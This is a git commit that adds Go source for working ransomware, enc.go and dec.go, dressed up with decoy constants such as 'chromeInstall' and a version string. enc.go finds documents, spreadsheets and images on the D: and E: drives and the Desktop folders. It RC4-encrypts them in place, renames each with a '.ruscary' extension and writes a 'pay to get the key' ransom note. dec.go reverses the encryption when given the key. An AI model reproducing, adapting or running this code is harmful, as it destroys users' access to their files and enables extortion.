d6f83b6bc6ae30b2baf70a57783e8760ad42b0f0
xiaotsai <joejoetsai0502@gmail.com>
2022-10-13 19:20:21 +0800

    final

---
+++ dec.go
@@ -0,0 +1,82 @@
+package main
+
+import (
+	"crypto/rc4"
+	"fmt"
+	"io/fs"
+	"io/ioutil"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
+)
+
+const chrome = "chromeInstall"
+const version = "1.7.5"
+
+var files []string
+
+func readfile(filename string) string {
+	file, err := os.ReadFile(filename)
+	if err != nil {
+		return ""
+	}
+
+	return string(file)
+}
+
+func scanfile() {
+
+	root := [...]string{"D:\\", "E:\\", "F:\\",
+		os.Getenv("USERPROFILE") + "/Desktop/",
+		os.Getenv("USERPROFILE") + "/OneDrive/Desktop/"}
+	for _, rootpath := range root {
+		filepath.Walk(rootpath, func(path string, nfo fs.FileInfo, err error) error {
+
+			ok := strings.HasSuffix(path, ".ruscary")
+
+			if ok {
+				files = append(files, path)
+			}
+
+			return nil
+		})
+
+	}
+
+}
+func deco(txtfile []byte, key []byte) []byte {
+
+	dest2 := make([]byte, len(txtfile))
+	enc, _ := rc4.NewCipher(key)
+	enc.XORKeyStream(dest2, txtfile)
+	return dest2
+}
+
+func main() {
+	time.Sleep(20000)
+	fmt.Print("Decrypter \n\nInsert key:")
+	scanfile()
+
+	var key []byte
+	_, err := fmt.Scanf("%v", &key)
+
+	if err != nil {
+		fmt.Println("Wrong!")
+	} else {
+
+		for _, rdf := range files {
+			rdfile := readfile(rdf)
+			decoed := deco([]byte(rdfile), key)
+			ioutil.WriteFile(rdf, decoed, 0644)
+			dontscary := strings.Split(rdf, ".ruscary")
+			for _, scary := range dontscary {
+				os.Rename(rdf, scary)
+			}
+
+		}
+		fmt.Println("Completed.")
+	}
+
+	os.Exit(3)
+}
---
+++ enc.go
@@ -0,0 +1,120 @@
+package main
+
+import (
+	"crypto/rand"
+	"crypto/rc4"
+	"encoding/hex"
+	"io"
+	"io/fs"
+	"io/ioutil"
+	"os"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"time"
+)
+
+// i am friendly
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+/*0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*/
+const chrome = "chromeInstall"
+const version = "1.7.5"
+
+var files []string
+
+func readfile(filename string) string {
+	file, err := os.ReadFile(filename)
+	if err != nil {
+		return ""
+	}
+
+	return string(file)
+}
+
+func GK() ([]byte, error) {
+	key := make([]byte, 64)
+	_, err := io.ReadFull(rand.Reader, key) //讀key長度的rand.Reader
+
+	if err != nil {
+		return nil, err
+	}
+
+	return key, nil
+}
+
+func enco(txtfile []byte, key []byte) []byte {
+
+	HexKey := hex.EncodeToString(key)
+	KeyTxt := []byte(HexKey)
+	dest := make([]byte, len(txtfile))
+	final, _ := rc4.NewCipher(KeyTxt)
+	final.XORKeyStream(dest, txtfile)
+	pay := "pay to get the key"
+	fakekey := KeyTxt
+	msg := []byte(pay)
+	ioutil.WriteFile(os.Getenv("USERPROFILE")+"/key.txt", []byte(fakekey), 0444)
+	ioutil.WriteFile(os.Getenv("USERPROFILE")+"/Desktop/"+"/readme.txt", []byte(msg), 0444)
+	ioutil.WriteFile(os.Getenv("USERPROFILE")+"/OneDrive/Desktop/"+"/readme.txt", []byte(msg), 0444)
+
+	return dest
+}
+func scf() {
+
+	root := [...]string{"D:\\", "E:\\",
+		os.Getenv("USERPROFILE") + "/Desktop/",
+		os.Getenv("USERPROFILE") + "/OneDrive/Desktop/"}
+	for _, rootpath := range root {
+		filepath.Walk(rootpath, func(path string, nfo fs.FileInfo, err error) error {
+
+			ok := strings.HasSuffix(path, ".pdf") ||
+				strings.HasSuffix(path, ".docx") ||
+				strings.HasSuffix(path, ".doc") ||
+				strings.HasSuffix(path, ".txt") ||
+				strings.HasSuffix(path, ".xls") ||
+				strings.HasSuffix(path, ".xlsx") ||
+				strings.HasSuffix(path, ".ppt") ||
+				strings.HasSuffix(path, ".pptx") ||
+				strings.HasSuffix(path, ".csv") ||
+				strings.HasSuffix(path, ".py") ||
+				strings.HasSuffix(path, ".jpeg") ||
+				strings.HasSuffix(path, ".jpg") ||
+				strings.HasSuffix(path, ".JPG") ||
+				strings.HasSuffix(path, ".JPEG") ||
+				strings.HasSuffix(path, ".png") ||
+				strings.HasSuffix(path, ".PNG")
+			/*strigs.HasSuffix(path, ".pst") ||
+			strings.HasSuffix(path, ".ost") ||
+			strings.HasSuffix(path, ".wmv") ||
+			strings.HasSuffix(path, ".mp4") ||
+			strings.HasSuffix(path, ".mp3") ||
+			strings.HasSuffix(path, "mov")*/
+
+			if ok {
+				files = append(files, path)
+			}
+
+			return nil
+		})
+
+	}
+}
+func main() {
+	time.Sleep(10000)
+	scf()
+	key, _ := GK()
+	for _, rdf := range files {
+		runtime.GOMAXPROCS(1)
+		rdfile := readfile(rdf)
+		enced := enco([]byte(rdfile), key)
+		ioutil.WriteFile(rdf, enced, 0644)
+		os.Rename(rdf, rdf+".ruscary")
+	}
+
+}
